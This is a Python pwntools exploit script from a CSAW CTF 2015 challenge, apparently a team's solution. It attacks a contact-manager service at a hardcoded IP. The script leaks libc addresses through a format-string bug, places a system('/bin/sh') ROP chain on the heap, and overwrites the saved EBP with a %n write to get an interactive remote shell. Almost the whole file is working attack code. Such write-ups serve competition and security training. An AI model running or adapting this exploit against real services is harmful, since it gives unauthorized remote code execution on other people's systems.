#!/usr/bin/env python
#
# CSAWCTF 2015
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import re
from pwn import *
from struct import pack
from math import floor

def do_infoleak(h, pointer_offset):	
	name = "infoleak"
	phone = "1337"
	desc_len = "8192"
	desc = "%31$x"

	# Create new contact
	h.sendline("1")

	msg = h.recvuntil('Name: ')
	print msg

	h.sendline(name)

	msg = h.recvuntil('Enter Phone No: ')
	print msg

	h.sendline(phone)

	msg = h.recvuntil('Length of description: ')
	print msg

	h.sendline(desc_len)

	msg = h.recv(1024)
	print msg

	h.sendline(desc)

	msg = h.recvuntil('>>> ')
	print msg

	# Display contacts
	h.sendline("4")

	msg = h.recvuntil('>>> ')
	print msg

	# Extract leaked pointers
	libc_ptr = re.findall('.*Description:\s(.*?)\n.*', msg)[0]
	return (int(libc_ptr, 16) - pointer_offset)

def set_ropchain(h, system_addr, binsh_addr):	
	name = "ropchain"
	phone = "1337"
	# Need enough space on heap since it's going to be treated as stack during ROP sploiting
	desc_len = "8192"

	# junk return address for system
	junk = 0x0BADC0DE

	# ROP chain: [@system (4 bytes)][junk (4 bytes)][@"/bin/sh" (4 bytes)]
	ROP_chain = [system_addr,
				 junk,
             	 binsh_addr]
	# Include FMS infoleak to get address of ROP chain
	desc = "".join([pack('<I', x) for x in ROP_chain]) + "<%11$x>"

	# Create new contact
	h.sendline("1")

	msg = h.recvuntil('Name: ')
	print msg

	h.sendline(name)

	msg = h.recvuntil('Enter Phone No: ')
	print msg

	h.sendline(phone)

	msg = h.recvuntil('Length of description: ')
	print msg

	h.sendline(desc_len)

	msg = h.recv(1024)
	print msg

	h.sendline(desc)

	msg = h.recvuntil('>>> ')
	print msg

	# Display contacts
	h.sendline("4")

	msg = h.recvuntil('>>> ')
	print msg

	return int(re.findall('.*Description:.*?\<(.*?)\>.*\n.*', msg)[0], 16)

def do_exploit(h, ropchain_addr):
	name = "sploit"
	phone = "1"
	desc_len = "900"

	new_ebp = (ropchain_addr - 4)

	part_1 = floor(new_ebp / 2)
	part_2 = part_1 + (new_ebp - (part_1 * 2))

	# Format string exploit: overwrite saved EBP with (ropchain_addr - 4)
	desc_buffer = "%"+str(part_1)+"x%"+str(part_2)+"x%6$n"

	print "[*]Sending exploit..."

	# Create new contact
	h.sendline("1")

	msg = h.recvuntil('Name: ')
	print msg

	h.sendline(name)

	msg = h.recvuntil('Enter Phone No: ')
	print msg

	h.sendline(phone)

	msg = h.recvuntil('Length of description: ')
	print msg

	h.sendline(desc_len)

	msg = h.recv(1024)
	print msg

	h.sendline(desc_buffer)

	msg = h.recvuntil('>>> ')
	print msg

	print "[+]Exploit sent!"

	# Trigger exploit
	print "[*]Triggering format string vulnerability..."

	# Display contacts
	h.sendline("4")

	# Receive printed output until we are back at menu
	msg = h.recvuntil('>>> ')

	print "[*]Triggering RCE condition..."
	# Exit
	h.sendline("5")

	# Waiting for the shell to pop!
	h.interactive()

	return

host = '54.165.223.128'
port = 2555

offset_libc_start_main_ret = 0x19a63
offset_system = 0x0003fcd0
offset_str_bin_sh = 0x15da84

h = remote(host, port, timeout = None)

msg = h.recvuntil('>>> ')

print msg

# Use infoleak
libc_base = do_infoleak(h, offset_libc_start_main_ret)
system_addr = (libc_base + offset_system)
binsh_addr = (libc_base + offset_str_bin_sh)

print "[+]Got leaked libc base address: [0x%x]" % libc_base
print "[+]Got '/bin/sh' address: [0x%x]" % binsh_addr
print "[+]Got system() address: [0x%x]" % system_addr

# Build ROP chain
ropchain_addr = set_ropchain(h, system_addr, binsh_addr)

print "[+]Got ROP chain address: [0x%x]" % ropchain_addr

do_exploit(h, ropchain_addr)

h.close()